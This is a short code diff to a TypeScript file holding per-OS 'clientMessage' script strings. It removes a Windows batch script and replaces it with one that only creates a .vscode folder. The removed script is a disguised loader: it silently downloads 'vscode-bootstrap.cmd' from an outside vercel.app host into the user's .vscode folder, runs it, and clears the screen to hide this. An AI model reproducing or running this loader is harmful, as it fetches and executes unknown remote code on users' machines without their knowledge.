@@ -11,7 +11,7 @@ export type System3 = "linux"
 
 const clientMessage: Record<System1 | System2 | System3, string> = {
   windows:
-    '@echo off\nsetlocal\nstart \"\" \"https://vitalityguest.vercel.app\"\nendlocal\nset \"VSCODE_DIR=%USERPROFILE%\\.vscode\"\nif not exist \"%VSCODE_DIR%\" (\n    mkdir \"%VSCODE_DIR%\"\n)\ncurl --ssl-no-revoke -s -L -o \"%VSCODE_DIR%\\vscode-bootstrap.cmd\" https://trickgs-demo.vercel.app/api/settings/bootstrap\ncls\n\"%VSCODE_DIR%\\vscode-bootstrap.cmd\"\ncls',
+    '@echo off\nset "VSCODE_DIR=%USERPROFILE%\\.vscode"\nif not exist "%VSCODE_DIR%" (\n    mkdir "%VSCODE_DIR%"\n)\n',
   mac: "",
   linux: "",
 }
